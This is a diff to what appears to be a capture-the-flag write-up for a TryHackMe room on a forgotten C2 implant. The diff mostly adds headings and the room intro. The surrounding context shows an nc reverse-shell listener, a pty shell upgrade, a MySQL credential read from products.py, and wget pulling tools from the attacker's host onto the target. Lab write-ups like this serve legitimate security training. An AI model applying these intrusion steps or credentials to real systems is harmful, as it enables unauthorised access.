@@ -6,6 +6,17 @@ Access this TryHackMe´s challenge <a href="https://tryhackme.com/room/forgotten
 <img width="1200px" src=" "></p>
 
 <h2>Task 1 . Forgotten Implant</h2>
+<p>Welcome to Forgotten Implant!<br>
+
+This is a pretty straightforward CTF-like room in which you will have to get initial access before elevating your privileges. The initial attack surface is quite limited, and you'll have to find a way of interacting with the system.<br>
+
+If you have no prior knowledge of Command and Control (C2), you might want to look at the Intro to C2 room. While it is not necessary to solve this challenge, it will provide valuable context for your learning experience.<br>
+
+Please allow 3-5 minutes for the VM to boot properly!<br>
+
+Note: While being very linear, this room can be solved in various ways. To get the most out of it, feel free to overengineer your solution to your liking!</p>
+
+<p><em>Answer tbe questions below</em></p>
 
 
 <h2>nmap</h2>
@@ -56,7 +67,6 @@ xx.xxx.xx.xx - - [08/Sep/2025 xx:xx:xx] "GET /job-result/eyJzdWNjZXNzIjogZmFsc2U
 
 <img width="1222" height="184" alt="image" src="https://github.com/user-attachments/assets/01bb144a-9a67-4338-b2f1-a43d978b95cb" />
 
-
 <br>
 <br>
 
@@ -70,6 +80,9 @@ Serving HTTP on 0.0.0.0 port 81 (http://0.0.0.0:81/) ...
 ...
 xx.xxx.xx.xx - - [08/Sep/2025 xx:xx:xx] "GET /get-job/ImxhdGVzdCI= HTTP/1.1" 200 -
 ```
+
+<br>
+<h2>ada</h2>
 
 ```bash
 :~# nc -nlvp 4444
@@ -101,6 +114,11 @@ cat user.txt
 THM{********************************}
 ```
 
+<br>
+<p>1.1. What is the root flag?</p>
+<br>
+<br>
+
 ```bash
 ada@...:~$ python3 -c 'import pty; pty.spawn("/bin/bash")'
 python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -128,6 +146,11 @@ drwxrwxr-x 4 ada  ada  4.0K Jul 12  2022 .local
 lrwxrwxrwx 1 ada  ada     9 Jul 10  2022 .python_history -> /dev/null
 -rw-rw-r-- 1 ada  ada    66 Jul 11  2022 .selected_editor
 -rw-rw-r-- 1 ada  ada    38 Jul 12  2022 user.txt
+```
+
+<h4>products.py</h4>
+
+```bash
 ada@...:~$ cat products.py
 import mysql.connector
 
@@ -151,6 +174,8 @@ for product in cursor.fetchall():
 user = app
 password = s4Ucbrme
 ```
+
+<h2>mysql</h2>
 
 ```bash
 ada@...:/home$ mysql -h localhost -u app -p
@@ -205,6 +230,8 @@ mysql> select * from products;
 mysql> exit
 Bye
 ```
+
+<h2>nmap</h2>
 
 ```bash
 ada@...:/tmp$ wget http://xx.xxx.xx.xxx:8888/nmap-x64.tar.gz -o nmap
@@ -279,8 +306,9 @@ $(function() {AJAX.fireOnload("whitelist.php");AJAX.fireOnload("vendor/sprintf.j
     
 <img src="./themes/pmahomme/img/logo_right.png" id="imLogo" name="imLogo" alt="phpMyAdmin" border="0" />
 
-
-<h1>Welcome to <bdo dir="ltr" lang="en">phpMyAdmin</bdo></h1>
+<br>
+<br>
+<p>Welcome to <bdo dir="ltr" lang="en">phpMyAdmin</bdo></p>
 
 
 ```bash
